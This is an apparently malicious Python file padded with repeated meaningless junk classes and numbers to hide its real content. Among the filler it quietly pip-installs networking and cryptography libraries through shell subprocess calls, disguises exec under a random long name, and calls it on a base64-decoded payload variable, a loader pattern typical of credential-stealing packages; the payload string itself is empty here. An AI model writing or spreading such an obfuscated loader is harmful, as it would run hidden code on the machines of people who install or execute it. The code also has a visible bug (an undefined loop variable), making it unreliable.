

from sys import executable, stderr
VtElwo8RGr = 54309971
'kwL6mdlybo'
dEYqP9HxZ0 = 69188311
class xwgE7cZqbB:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
jXdyzXOZSy = 66264373
["'XlvkVLn9wE'", "'OTykyW6Yac'", "'dmwreA5V0b'", "'B44pDkl90j'", "'jyKFAPy94V'"]
class TUhwdFx82X:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'Jp4WejU', 'age': 79}
DALR4rSAFb = 95677482
class ya84uKXIQB:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class pvdNk5fVdg:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
ppOwZxR4OL = 69526603
Wm0iExQGmo = 25595561
suVQAVzHNp = 5134926
WLqcxWjUHR = 78754332
class Halehr8A5J:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class oXQyePNLJH:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class yqeWDWgn3D:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
ddifdqnNMR = 31508218
class Lmp9hj46fi:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class ZEDTKh8e5t:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class muTpTfrViu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
I5FmU6e5yB = 29533183
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
VtElwo8RGr = 54309971
'kwL6mdlybo'
dEYqP9HxZ0 = 69188311
class xwgE7cZqbB:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
jXdyzXOZSy = 66264373
["'XlvkVLn9wE'", "'OTykyW6Yac'", "'dmwreA5V0b'", "'B44pDkl90j'", "'jyKFAPy94V'"]
class TUhwdFx82X:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'Jp4WejU', 'age': 79}
DALR4rSAFb = 95677482
class ya84uKXIQB:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class pvdNk5fVdg:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
ppOwZxR4OL = 69526603
Wm0iExQGmo = 25595561
suVQAVzHNp = 5134926
WLqcxWjUHR = 78754332
class Halehr8A5J:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class oXQyePNLJH:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class yqeWDWgn3D:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
ddifdqnNMR = 31508218
class Lmp9hj46fi:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class ZEDTKh8e5t:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class muTpTfrViu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
I5FmU6e5yB = 29533183
NDanJQYEP0XWkpP0xMrIqoA9xiYTyrKjrZkeCb = exec
VtElwo8RGr = 54309971
'kwL6mdlybo'
dEYqP9HxZ0 = 69188311
class xwgE7cZqbB:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
jXdyzXOZSy = 66264373
["'XlvkVLn9wE'", "'OTykyW6Yac'", "'dmwreA5V0b'", "'B44pDkl90j'", "'jyKFAPy94V'"]
class TUhwdFx82X:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'Jp4WejU', 'age': 79}
DALR4rSAFb = 95677482
class ya84uKXIQB:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class pvdNk5fVdg:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
ppOwZxR4OL = 69526603
Wm0iExQGmo = 25595561
suVQAVzHNp = 5134926
WLqcxWjUHR = 78754332
class Halehr8A5J:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class oXQyePNLJH:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class yqeWDWgn3D:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
ddifdqnNMR = 31508218
class Lmp9hj46fi:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class ZEDTKh8e5t:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class muTpTfrViu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
I5FmU6e5yB = 29533183
import concurrent.futures
K1mgBJPOsTFaI0poVvdOc2qYdCSAYjgTCLxGYM=""
NDanJQYEP0XWkpP0xMrIqoA9xiYTyrKjrZkeCb(base64.b64decode(K1mgBJPOsTFaI0poVvdOc2qYdCSAYjgTCLxGYM))
VtElwo8RGr = 54309971
'kwL6mdlybo'
dEYqP9HxZ0 = 69188311
class xwgE7cZqbB:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
jXdyzXOZSy = 66264373
["'XlvkVLn9wE'", "'OTykyW6Yac'", "'dmwreA5V0b'", "'B44pDkl90j'", "'jyKFAPy94V'"]
class TUhwdFx82X:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'Jp4WejU', 'age': 79}
DALR4rSAFb = 95677482
class ya84uKXIQB:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class pvdNk5fVdg:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
ppOwZxR4OL = 69526603
Wm0iExQGmo = 25595561
suVQAVzHNp = 5134926
WLqcxWjUHR = 78754332
class Halehr8A5J:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class oXQyePNLJH:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class yqeWDWgn3D:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
ddifdqnNMR = 31508218
class Lmp9hj46fi:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class ZEDTKh8e5t:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class muTpTfrViu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
I5FmU6e5yB = 29533183